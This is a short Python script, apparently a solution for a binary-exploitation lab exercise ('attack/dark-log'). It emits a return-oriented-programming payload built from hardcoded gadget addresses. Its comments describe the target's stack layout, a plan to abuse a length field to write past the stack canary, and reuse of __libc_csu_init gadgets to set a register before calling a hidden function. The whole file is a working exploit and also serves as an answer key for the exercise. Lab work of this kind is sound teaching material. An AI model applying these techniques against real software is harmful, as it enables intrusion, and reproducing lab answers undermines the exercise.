#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

# function grade_eval starts at 0x401677
# gets([rbp - 0x120])
# -0x120 ~ -0xA0 : expression
# -0xA0 ~ -0x20 : logMsg
# -0x20 ~ -0x18 : len
# -0x18 ~ -0x10 : pad

# Apparently the key is to exploit the field `len` to copy the data somewhere beyond the canary
# But before calling grade_eval, we must make sure rdi = 4. We can exploit __libc_csu_init again.
round1 = b"\x9a\x18\x40\x00\x00\x00\x00\x00" + b"\x00" * 8 + b"\x01\x00\x00\x00\x00\x00\x00\x00" + b"\x30\x20\x60\x00\x00\x00\x00\x00" + b"\x90\x20\x60\x00\x00\x00\x00\x00" + b"\x00" * 16 + b"\x86\x18\x40\x00\x00\x00\x00\x00"
round2 = b"\x00" * 16 + b"\x01\x00\x00\x00\x00\x00\x00\x00" + b"\x90\x20\x60\x00\x00\x00\x00\x00" + b"\x04\x00\x00\x00\x00\x00\x00\x00" + b"\x00" * 16 + b"\x86\x18\x40\x00\x00\x00\x00\x00"
launcher = b"?" * 0x80  + b"\xA8\x00\x00\x00\x00\x00\x00"
extra_input = b"\x77\x16\x40\x00\x00\x00\x00"
payload = round1 + round2 + launcher + b"\n" + extra_input

sys.stdout.buffer.write(payload)
